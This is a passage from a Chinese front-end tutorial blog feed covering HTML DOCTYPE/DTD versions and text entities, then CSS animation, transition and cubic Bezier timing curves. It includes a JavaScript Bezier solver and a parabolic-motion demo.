html4.01，还包含了一些被贬斥的标签，这些标签已经不再推荐使用了，但是过渡模式中仍保留了它们。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">HTML</span> <span class="keyword">PUBLIC</span> <span class="string">&quot;-//W3C//DTD HTML 4.01 Frameset//EN&quot;</span> <span class="string">&quot;http://www.w3.org/TR/html4/frameset.dtd&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>frameset 结构的网页如今已经很少见到了，它使用 frameset 标签把几个网页组合到一起。</p><p>众所周知，HTML 中允许一些标签不闭合的用法，实际上这些都是符合 SGML 规定的，并且在 DTD 中规定好了的。但是，一些程序员喜欢严格遵守 XML 语法，保证标签闭合性，所以，HTML4.01 又规定了 XHTML 语法，同样有三个版本：</p><p>版本一</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span> <span class="keyword">PUBLIC</span> <span class="string">&quot;-//W3C//DTD XHTML 1.0 Strict//EN&quot;</span> </span></span><br><span class="line"><span class="meta"><span class="string">&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>版本二</p><figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span> <span class="keyword">PUBLIC</span> <span class="string">&quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot;</span> <span class="string">&quot;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="language-xml">http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>版本三</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span> <span class="keyword">PUBLIC</span> <span class="string">&quot;-//W3C//DTD XHTML 1.0 Frameset//EN&quot;</span> </span></span><br><span class="line"><span class="meta"><span class="string">&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-frameset.dtd&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>其实你看看就知道，这些复杂的 DTD 写法并没有什么实际作用（浏览器根本不会用 SGML 引擎解析它们），因此，到了 HTML5，干脆放弃了 SGML 子集这项坚持，规定了一个简单的，大家都能记住的 DTD：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line">````</span><br><span class="line"></span><br><span class="line">但是，HTML5 仍然保留了 HTML 语法和 XHTML 语法。</span><br><span class="line"></span><br><span class="line">## 文本实体</span><br><span class="line"></span><br><span class="line">不知道你注意到没有，HTML4.01 的 DTD 里包含了一个长得很像是 URL 的东西，其实它是真的可以访问的——但是 W3C 警告说，禁止任何浏览器在解析网页的时候访问这个 URL，不然 W3C 的服务器会被压垮。我相信很多好奇的前端工程师都把它下载下来打开过。</span><br><span class="line"></span><br><span class="line">这是符合 SGML 规范的 DTD，我们前面讲过，SGML 的规范十分复杂，所以这里我并不打算讲 SGML（其实我也不会），但是这不妨碍我们了解一下 DTD 的内容。这个 DTD 规定了 HTML 包含了哪些标签、属性和文本实体。其中文本实体分布在三个文件中：HTMLsymbol.ent HTMLspecial.ent 和 HTMLlat1.ent。</span><br><span class="line"></span><br><span class="line">所谓文本实体定义就是类似以下的代码：</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>&lt;<br>&amp;nbsp;<br>&gt;<br>&amp;</p><pre><code>每一个文本实体由&amp;开头，由;结束，这属于基本语法的规定，文本实体可以用#后跟一个十进制数字，表示字符 Unicode 值。除此之外这两个符号之间的内容，则由 DTD 决定。我这里数了一下，HTML4.01 的 DTD 中，共规定了 255 个文本实体。</code></pre>]]></content>
      
      
      <categories>
          
          <category> relearnFE </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>21丨HTML&amp;CSS：CSS动画与交互</title>
      <link href="/Blog/2019/01/30/relearn_FE/21%E4%B8%A8HTML&amp;CSS%EF%BC%9ACSS%E5%8A%A8%E7%94%BB%E4%B8%8E%E4%BA%A4%E4%BA%92/index/"/>
      <url>/Blog/2019/01/30/relearn_FE/21%E4%B8%A8HTML&amp;CSS%EF%BC%9ACSS%E5%8A%A8%E7%94%BB%E4%B8%8E%E4%BA%A4%E4%BA%92/index/</url>
      
        <content type="html"><![CDATA[<blockquote><p>在 CSS 属性中，有这么一类属性，它负责的不是静态的展现，而是根据用户行为产生交互。这就是今天我们要讲的属性。</p></blockquote><p>首先我们先从属性来讲起。CSS 中跟动画相关的属性有两个：animation 和 transition。</p><h2 id="animation-属性和-transition-属性"><a href="#animation-属性和-transition-属性" class="headerlink" title="animation 属性和 transition 属性"></a>animation 属性和 transition 属性</h2><p>我们先来看下 animation 的示例，通过示例来了解一下 animation 属性的基本用法:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">@keyframes</span> mykf</span><br><span class="line">&#123;</span><br><span class="line">  <span class="selector-tag">from</span> &#123;<span class="attribute">background</span>: red;&#125;</span><br><span class="line">  <span class="selector-tag">to</span> &#123;<span class="attribute">background</span>: yellow;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">div</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="attribute">animation</span>:mykf <span class="number">5s</span> infinite;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里展示了 animation 的基本用法，实际上 animation 分成六个部分：</p><ul><li>animation-name 动画的名称，这是一个 keyframes 类型的值（我们在第 9 讲“CSS 语法：除了属性和选择器，你还需要知道这些带 @的规则”讲到过，keyframes 产生一种数据，用于定义动画关键帧）；</li><li>animation-duration 动画的时长；</li><li>animation-timing-function 动画的时间曲线；</li><li>animation-delay 动画开始前的延迟；</li><li>animation-iteration-count 动画的播放次数；</li><li>animation-direction 动画的方向。</li></ul><p>我们先来看 animation-name，这个是一个 keyframes 类型，需要配合 @规则来使用。</p><p>比如，我们前面的示例中，就必须配合定义 mymove 这个 keyframes。keyframes 的主体结构是一个名称和花括号中的定义，它按照百分比来规定数值，例如：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">@keyframes</span> mykf &#123;</span><br><span class="line">  <span class="number">0%</span> &#123; <span class="attribute">top</span>: <span class="number">0</span>; &#125;</span><br><span class="line">  <span class="number">50%</span> &#123; <span class="attribute">top</span>: <span class="number">30px</span>; &#125;</span><br><span class="line">  <span class="number">75%</span> &#123; <span class="attribute">top</span>: <span class="number">10px</span>; &#125;</span><br><span class="line">  <span class="number">100%</span> &#123; <span class="attribute">top</span>: <span class="number">0</span>; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们可以规定在开始时把 top 值设为 0，在 50% 是设为 30px，在 75% 时设为 10px，到 100% 时重新设为 0，这样，动画执行时就会按照我们指定的关键帧来变换数值。</p><p>这里，0% 和 100% 可以写成 from 和 to，不过一般不会混用，画风会变得很奇怪，比如：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">@keyframes</span> mykf &#123;</span><br><span class="line">  <span class="selector-tag">from</span> &#123; <span class="attribute">top</span>: <span class="number">0</span>; &#125;</span><br><span class="line">  <span class="number">50%</span> &#123; <span class="attribute">top</span>: <span class="number">30px</span>; &#125;</span><br><span class="line">  <span class="number">75%</span> &#123; <span class="attribute">top</span>: <span class="number">10px</span>; &#125;</span><br><span class="line">  <span class="selector-tag">to</span> &#123; <span class="attribute">top</span>: <span class="number">0</span>; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里关键帧之间，是使用 animation-timing-function 作为时间曲线的，稍后我会详细介绍时间曲线。</p><p>接下来我们来介绍一下 transition。transition 与 animation 相比来说，是简单得多的一个属性。</p><p>它有四个部分：</p><ul><li>transition-property 要变换的属性；</li><li>transition-duration 变换的时长；</li><li>transition-timing-function 时间曲线；</li><li>transition-delay 延迟。</li></ul><p>这里的四个部分，可以重复多次，指定多个属性的变换规则。</p><p>实际上，有时候我们会把 transition 和 animation 组合，抛弃 animation 的 timing-function，以编排不同段用不同的曲线。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">@keyframes</span> mykf &#123;</span><br><span class="line">  <span class="selector-tag">from</span> &#123; <span class="attribute">top</span>: <span class="number">0</span>; <span class="attribute">transition</span>:top ease&#125;</span><br><span class="line">  <span class="number">50%</span> &#123; <span class="attribute">top</span>: <span class="number">30px</span>;<span class="attribute">transition</span>:top ease-in &#125;</span><br><span class="line">  <span class="number">75%</span> &#123; <span class="attribute">top</span>: <span class="number">10px</span>;<span class="attribute">transition</span>:top ease-out &#125;</span><br><span class="line">  <span class="selector-tag">to</span> &#123; <span class="attribute">top</span>: <span class="number">0</span>; <span class="attribute">transition</span>:top linear&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这个例子中，在 keyframes 中定义了 transition 属性，以达到各段曲线都不同的效果。</p><p>接下来，我们就来详细讲讲刚才提到的 timing-function，动画的时间曲线。</p><h2 id="三次贝塞尔曲线"><a href="#三次贝塞尔曲线" class="headerlink" title="三次贝塞尔曲线"></a>三次贝塞尔曲线</h2><p>我想，你能从很多 CSS 的资料中都找到了贝塞尔曲线，但是为什么 CSS 的时间曲线要选用（三次）贝塞尔曲线呢？</p><p>我们在这里首先要了解一下贝塞尔曲线，贝塞尔曲线是一种插值曲线，它描述了两个点之间差值来形成连续的曲线形状的规则。</p><p>一个量（可以是任何矢量或者标量）从一个值到变化到另一个值，如果我们希望它按照一定时间平滑地过渡，就必须要对它进行插值。</p><p>最基本的情况，我们认为这个变化是按照时间均匀进行的，这个时候，我们称其为线性插值。而实际上，线性插值不大能满足我们的需要，因此数学上出现了很多其它的插值算法，其中贝塞尔插值法是非常典型的一种。它根据一些变换中的控制点来决定值与时间的关系。</p><p>贝塞尔曲线是一种被工业生产验证了很多年的曲线，它最大的特点就是“平滑”。时间曲线平滑，意味着较少突兀的变化，这是一般动画设计所追求的。</p><p>贝塞尔曲线用于建筑设计和工业设计都有很多年历史了，它最初的应用是汽车工业用贝塞尔曲线来设计车型。</p><p>K 次贝塞尔插值算法需要 k+1 个控制点，最简单的一次贝塞尔插值就是线性插值，将时间表示为 0 到 1 的区间，一次贝塞尔插值公式是：</p><p><img src="/Blog/2019/01/30/relearn_FE/21%E4%B8%A8HTML&CSS%EF%BC%9ACSS%E5%8A%A8%E7%94%BB%E4%B8%8E%E4%BA%A4%E4%BA%92/index/img.png"></p><p>“二次贝塞尔插值”有 3 个控制点，相当于对 P0 和 P1，P1 和 P2 分别做贝塞尔插值，再对结果做一次贝塞尔插值计算</p><p><img src="/Blog/2019/01/30/relearn_FE/21%E4%B8%A8HTML&CSS%EF%BC%9ACSS%E5%8A%A8%E7%94%BB%E4%B8%8E%E4%BA%A4%E4%BA%92/index/img_1.png"></p><p>“三次贝塞尔插值”则是“两次‘二次贝塞尔插值’的结果，再做一次贝塞尔插值”：</p><p><img src="/Blog/2019/01/30/relearn_FE/21%E4%B8%A8HTML&CSS%EF%BC%9ACSS%E5%8A%A8%E7%94%BB%E4%B8%8E%E4%BA%A4%E4%BA%92/index/img_2.png"></p><p>贝塞尔曲线的定义中带有一个参数 t，但是这个 t 并非真正的时间，实际上贝塞尔曲线的一个点 (x, y)，这里的 x 轴才代表时间。</p><p>这就造成了一个问题，如果我们使用贝塞尔曲线的直接定义，是没办法直接根据时间来计算出数值的，因此，浏览器中一般都采用了数值算法，其中公认做有效的是牛顿积分，我们可以看下 JavaScript 版本的代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">generate</span>(<span class="params">p1x, p1y, p2x, p2y</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">ZERO_LIMIT</span> = <span class="number">1e-6</span>;</span><br><span class="line">    <span class="comment">// Calculate the polynomial coefficients,</span></span><br><span class="line">    <span class="comment">// implicit first and last control points are (0,0) and (1,1).</span></span><br><span class="line">    <span class="keyword">const</span> ax = <span class="number">3</span> * p1x - <span class="number">3</span> * p2x + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> bx = <span class="number">3</span> * p2x - <span class="number">6</span> * p1x;</span><br><span class="line">    <span class="keyword">const</span> cx = <span class="number">3</span> * p1x;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> ay = <span class="number">3</span> * p1y - <span class="number">3</span> * p2y + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> by = <span class="number">3</span> * p2y - <span class="number">6</span> * p1y;</span><br><span class="line">    <span class="keyword">const</span> cy = <span class="number">3</span> * p1y;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">sampleCurveDerivativeX</span>(<span class="params">t</span>) &#123;</span><br><span class="line">        <span class="comment">// `ax t^3 + bx t^2 + cx t&#x27; expanded using Horner &#x27;s rule.</span></span><br><span class="line">        <span class="keyword">return</span> (<span class="number">3</span> * ax * t + <span class="number">2</span> * bx) * t + cx;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">sampleCurveX</span>(<span class="params">t</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> ((ax * t + bx) * t + cx ) * t;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">sampleCurveY</span>(<span class="params">t</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> ((ay * t + by) * t + cy ) * t;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Given an x value, find a parametric value it came from.</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">solveCurveX</span>(<span class="params">x</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> t2 = x;</span><br><span class="line">        <span class="keyword">var</span> derivative;</span><br><span class="line">        <span class="keyword">var</span> x2;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// https://trac.webkit.org/browser/trunk/Source/WebCore/platform/animation</span></span><br><span class="line">        <span class="comment">// First try a few iterations of Newton&#x27;s method -- normally very fast.</span></span><br><span class="line">        <span class="comment">// http://en.wikipedia.org/wiki/Newton&#x27;s_method</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span><br><span class="line">            <span class="comment">// f(t)-x=0</span></span><br><span class="line">            x2 = <span class="title function_">sampleCurveX</span>(t2) - x;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title class_">Math</span>.<span class="title function_">abs</span>(x2) &lt; <span class="variable constant_">ZERO_LIMIT</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> t2;</span><br><span class="line">            &#125;</span><br><span class="line">            derivative = <span class="title function_">sampleCurveDerivativeX</span>(t2);</span><br><span class="line">            <span class="comment">// == 0, failure</span></span><br><span class="line">            <span class="comment">/* istanbul ignore if */</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="title class_">Math</span>.<span class="title function_">abs</span>(derivative) &lt; <span class="variable constant_">ZERO_LIMIT</span>) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            t2 -= x2 / derivative;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Fall back to the bisection method for reliability.</span></span><br><span class="line">        <span class="comment">// bisection</span></span><br><span class="line">        <span class="comment">// http://en.wikipedia.org/wiki/Bisection_method</span></span><br><span class="line">        <span class="keyword">var</span> t1 = <span class="number">1</span>;</span><br><span class="line">        <span class="comment">/* istanbul ignore next */</span></span><br><span class="line">        <span class="keyword">var</span> t0 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* istanbul ignore next */</span></span><br><span class="line">        t2 = x;</span><br><span class="line">        <span class="comment">/* istanbul ignore next */</span></span><br><span class="line">        <span class="keyword">while</span> (t1 &gt; t0) &#123;</span><br><span class="line">            x2 = <span class="title function_">sampleCurveX</span>(t2) - x;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title class_">Math</span>.<span class="title function_">abs</span>(x2) &lt; <span class="variable constant_">ZERO_LIMIT</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> t2;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (x2 &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                t1 = t2;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                t0 = t2;</span><br><span class="line">            &#125;</span><br><span class="line">            t2 = (t1 + t0) / <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Failure</span></span><br><span class="line">        <span class="keyword">return</span> t2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">solve</span>(<span class="params">x</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">sampleCurveY</span>(<span class="title function_">solveCurveX</span>(x));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> solve;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码其实完全翻译自 WebKit 的 C++ 代码，牛顿积分的具体原理请参考相关数学著作，注释中也有相关的链接。</p><p>这个 JavaScript 版本的三次贝塞尔曲线可以用于实现跟 CSS 一模一样的动画。</p><h2 id="贝塞尔曲线拟合"><a href="#贝塞尔曲线拟合" class="headerlink" title="贝塞尔曲线拟合"></a>贝塞尔曲线拟合</h2><p>理论上，贝塞尔曲线可以通过分段的方式拟合任意曲线，但是有一些特殊的曲线，是可以用贝塞尔曲线完美拟合的，比如抛物线。</p><p>这里我做了一个示例，用于模拟抛物线：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Simulation<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.ball</span> &#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">width</span>:<span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">height</span>:<span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">background-color</span>:black;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">border-radius</span>:<span class="number">5px</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">position</span>:absolute;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">left</span>:<span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">top</span>:<span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">transform</span>:<span class="built_in">translateY</span>(<span class="number">180px</span>);</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">  </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">label</span>&gt;</span>运动时间：<span class="tag">&lt;<span class="name">input</span> <span class="attr">value</span>=<span class="string">&quot;3.6&quot;</span> <span class="attr">type</span>=<span class="string">&quot;number&quot;</span> <span class="attr">id</span>=<span class="string">&quot;t&quot;</span> /&gt;</span>s<span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">label</span>&gt;</span>初速度：<span class="tag">&lt;<span class="name">input</span> <span class="attr">value</span>=<span class="string">&quot;-21&quot;</span> <span class="attr">type</span>=<span class="string">&quot;number&quot;</span> <span class="attr">id</span>=<span class="string">&quot;vy&quot;</span> /&gt;</span> px/s<span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">label</span>&gt;</span>水平速度：<span class="tag">&lt;<span class="name">input</span> <span class="attr">value</span>=<span class="string">&quot;21&quot;</span> <span class="attr">type</span>=<span class="string">&quot;number&quot;</span> <span class="attr">id</span>=<span class="string">&quot;vx&quot;</span> /&gt;</span> px/s<span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">label</span>&gt;</span>重力：<span class="tag">&lt;<span class="name">input</span> <span class="attr">value</span>=<span class="string">&quot;10&quot;</span> <span class="attr">type</span>=<span class="string">&quot;number&quot;</span> <span class="attr">id</span>=<span class="string">&quot;g&quot;</span> /&gt;</span> px/s²<span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;createBall()&quot;</span>&gt;</span>来一个球<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">generateCubicBezier</span> (v, g, t)&#123;</span><br><span class="line">    <span class="keyword">var</span> a = v / g;</span><br><span class="line">    <span class="keyword">var</span> b = t + v / g;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> [[(a / <span class="number">3</span> + (a + b) / <span class="number">3</span> - a) / (b - a), (a * a / <span class="number">3</span> + a * b * <span class="number">2</span> / <span class="number">3</span> - a * a) / (b * b - a * a)],</span><br><span class="line">        [(b / <span class="number">3</span> + (a + b) / <span class="number">3</span> - a) / (b - a), (b * b / <span class="number">3</span> + a * b * <span class="number">2</span> / <span class="number">3</span> - a * a) / (b * b - a * a)]];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">createBall</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> ball = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;div&quot;</span>);</span><br><span class="line">  <span class="keyword">var</span> t = <span class="title class_">Number</span>(<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;t&quot;</span>).<span class="property">value</span>);</span><br><span class="line">  <span class="keyword">var</span> vx = <span class="title class_">Number</span>(<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;vx&quot;</span>).<span class="property">value</span>);</span><br><span class="line">  <span class="keyword">var</span> vy = <span class="title class_">Number</span>(<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;vy&quot;</span>).<span class="property">value</span>);</span><br><span class="line">  <span class="keyword">var</span> g = <span class="title class_">Number</span>(<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;g&quot;</span>).<span class="property">value</span>);</span><br><span class="line">  ball.<span class="property">className</span> = <span class="string">&quot;ball&quot;</span>;</span><br><span class="line">  <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(ball)</span><br><span class="line">  ball.<span class="property">style</span>.<span class="property">transition</span> = <span class="string">`left linear <span class="subst">$&#123;t&#125;</span>s, top cubic-bezier(<span class="subst">$&#123;generateCubicBezier(vy, g, t)&#125;</span>) <span class="subst">$&#123;t&#125;</span>s`</span>;</span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123; </span><br><span class="line">    ball.<span class="property">style</span>.<span class="property">left</span> = <span class="string">`<span class="subst">$&#123;vx * t&#125;</span>px`</span>; </span><br><span class="line">    ball.<span class="property">style</span>.<span class="property">top</span> = <span class="string">`<span class="subst">$&#123;vy * t + <span class="number">0.5</span> * g * t * t&#125;</span>px`</span>; </span><br><span class="line">  &#125;, <span class="number">100</span>);</span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123; <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">removeChild</span>(ball); &#125;, t * <span class="number">1000</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码中，我实现了抛物线运动的小球，其中核心代码就是 generateCubicBezier 